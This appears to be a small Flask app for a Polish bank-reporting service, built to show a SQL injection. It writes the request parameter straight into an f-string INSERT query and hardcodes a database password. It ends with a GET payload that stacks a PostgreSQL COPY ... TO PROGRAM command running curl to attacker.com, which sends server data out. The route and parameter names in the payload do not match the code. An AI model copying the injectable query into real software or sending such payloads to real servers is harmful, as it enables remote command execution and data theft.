from flask import Flask, request
import psycopg2

app = Flask(__name__)

def log_query(parametr):
    conn = psycopg2.connect("dbname=bank-raporty user=admin password=zxcvqwer")
    cursor = conn.cursor()

    # Podatne zapytanie SQL
    query = f"INSERT INTO query_logs (parameter) VALUES ('{parametr}')"
    cursor.execute(query)
    conn.commit()
    conn.close()

@app.route('/report')
def generate_report():
    dzial = request.args.get('dzial', 'all')
    log_query(dzial)
    return f"Raport dla działu: {dzial}"


GET /raport?department=sales'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?version=' || version(); --

